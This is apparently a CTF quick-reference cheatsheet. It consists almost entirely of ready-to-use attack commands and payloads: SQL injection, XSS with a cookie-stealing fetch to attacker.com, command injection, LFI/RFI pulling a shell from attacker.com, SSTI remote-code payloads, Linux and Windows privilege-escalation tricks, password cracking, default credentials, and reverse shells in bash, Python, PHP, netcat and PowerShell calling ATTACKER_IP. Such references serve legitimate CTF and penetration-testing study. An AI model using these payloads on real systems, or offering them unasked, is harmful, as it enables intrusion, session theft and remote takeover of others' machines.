# CTF Quick Reference Cheatsheet

Quick commands and payloads for common CTF scenarios.

## 🔍 Reconnaissance

### Port Scanning
```bash
# Fast scan
rustscan -a $IP -- -sV -sC

# Full port scan
nmap -p- -T4 $IP

# UDP scan
nmap -sU --top-ports 100 $IP

# Aggressive scan
nmap -A -p- $IP
```

### Web Enumeration
```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Subdomain enumeration
ffuf -w /usr/share/wordlists/subdomains.txt -u http://$IP -H "Host: FUZZ.$DOMAIN"

# File extension fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ -e .php,.txt,.html,.bak
```

### Service Enumeration
```bash
# SMB
enum4linux -a $IP
smbclient -L //$IP
crackmapexec smb $IP --shares

# NFS
showmount -e $IP
mount -t nfs $IP:/share /mnt

# DNS
dig axfr @$IP domain.com
dnsenum $IP
```

## 🎯 Web Exploitation

### SQL Injection
```sql
# Authentication bypass
' OR 1=1-- -
" OR 1=1-- -
admin' OR '1'='1'-- -

# Union injection
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,database(),user()-- -
' UNION SELECT 1,table_name,NULL FROM information_schema.tables-- -

# Time-based blind
' AND SLEEP(5)-- -
' OR IF(1=1,SLEEP(5),0)-- -

# Boolean-based
' AND 1=1-- - (true)
' AND 1=2-- - (false)
```

### XSS
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Bypass filters -->
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<iframe src="javascript:alert(1)">

<!-- Exfiltration -->
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

### Command Injection
```bash
# Basic
; ls
| ls
|| ls
& ls
&& ls

# Blind
; sleep 10
| ping -c 10 attacker.com

# Encoded
%0als
%3Bls

# With variables
var=;ls;
```

### LFI/RFI
```bash
# Local File Inclusion
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
?file=../../../../var/log/apache2/access.log
# Inject: <?php system($_GET['cmd']); ?>

# PHP wrappers
?file=php://input (POST: <?php system('id'); ?>)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Remote File Inclusion
?file=http://attacker.com/shell.txt
```

### SSRF
```bash
# Internal services
http://localhost
http://127.0.0.1
http://0.0.0.0
http://169.254.169.254/latest/meta-data/ (AWS)

# Bypass filters
http://127.1
http://0177.0.0.1 (octal)
http://[::1]
http://[::ffff:127.0.0.1]
```

### Template Injection (SSTI)
```python
# Detection
{{7*7}}  # Jinja2, Twig
${7*7}   # Freemarker, JSP
<%= 7*7 %> # ERB

# Jinja2 RCE
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[400]('whoami',shell=True,stdout=-1).communicate()}}

# Python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{%endfor%}
```

## 🔐 Privilege Escalation (Linux)

### SUID Binaries
```bash
# Find SUID
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# GTFOBins exploits
/usr/bin/find . -exec /bin/sh \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Capabilities
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Common exploits
/usr/bin/python3 = cap_setuid+ep
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Sudo Abuse
```bash
# Check sudo rights
sudo -l

# Common exploits
sudo /usr/bin/env /bin/sh
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/less /etc/profile (then !sh)
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

### Cron Jobs
```bash
# Check cron
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Monitor processes
pspy64
```

### PATH Hijacking
```bash
# Check writable paths
echo $PATH | tr ':' '\n'

# Create malicious binary
cd /writable/path
echo '#!/bin/bash\n/bin/bash' > binary_name
chmod +x binary_name
```

### Kernel Exploits
```bash
# Check kernel version
uname -a

# Search exploits
searchsploit linux kernel $(uname -r)

# Common exploits
# Dirty Cow (CVE-2016-5195)
# OverlayFS (CVE-2015-1328)
# Dirty Pipe (CVE-2022-0847)
```

## 🪟 Privilege Escalation (Windows)

### System Info
```powershell
systeminfo
whoami /all
net user
net localgroup administrators
```

### Auto-Enum
```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

### Common Vectors
```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Token impersonation (SeImpersonate)
whoami /priv
# Use: JuicyPotato, RoguePotato
```

## 🔑 Password Cracking

### Hash Identification
```bash
hash-identifier
hashid -m [hash]
```

### John the Ripper
```bash
# Crack hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Format-specific
john --format=raw-md5 hash.txt
john --format=nt hash.txt

# Show cracked
john --show hash.txt
```

### Hashcat
```bash
# MD5
hashcat -m 0 hash.txt rockyou.txt

# NTLM
hashcat -m 1000 hash.txt rockyou.txt

# SHA-256
hashcat -m 1400 hash.txt rockyou.txt
```

### Hydra
```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP

# HTTP POST
hydra -l admin -P wordlist.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l ftp -P wordlist.txt ftp://$IP
```

## 🐚 Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### PowerShell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 🎨 Steganography

### Common Tools
```bash
# Images
steghide extract -sf image.jpg
zsteg image.png
exiftool image.jpg
binwalk image.jpg

# Audio
sonic-visualizer audio.wav
steghide extract -sf audio.wav

# Files
strings file.ext
hexdump -C file.ext
```

## 🔓 Default Credentials

Common defaults to try:
```
admin:admin
admin:password
root:root
root:toor
administrator:administrator
guest:guest
user:user
test:test
admin:admin123
admin:Admin123!
```

## 🌐 Common Ports

```
21    - FTP
22    - SSH
23    - Telnet
25    - SMTP
53    - DNS
80    - HTTP
110   - POP3
135   - MSRPC
139   - NetBIOS
143   - IMAP
443   - HTTPS
445   - SMB
1433  - MSSQL
3306  - MySQL
3389  - RDP
5432  - PostgreSQL
5900  - VNC
6379  - Redis
8080  - HTTP Proxy
```

## 📚 Quick Resources

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- Exploit-DB: https://www.exploit-db.com/
- RevShells: https://www.revshells.com/

## 💡 Quick Tips

1. **Always enumerate thoroughly** - most CTFs hide info
2. **Try default credentials** - they work more than you think
3. **Check GTFOBins** for ANY interesting binary
4. **Google is your friend** - search "[service] [version] exploit"
5. **Chain exploits** - LFI + Log Poisoning = RCE
6. **Read error messages** - they leak information
7. **Check source code** - HTML comments, JS files
8. **Fuzz everything** - params, headers, methods
9. **Think simple** - obvious solution often works
10. **Never give up** - take breaks, come back fresh

---

**Remember**: This is a reference, not a substitutfor understanding. Learn WHY these work, not just HOW to use them.
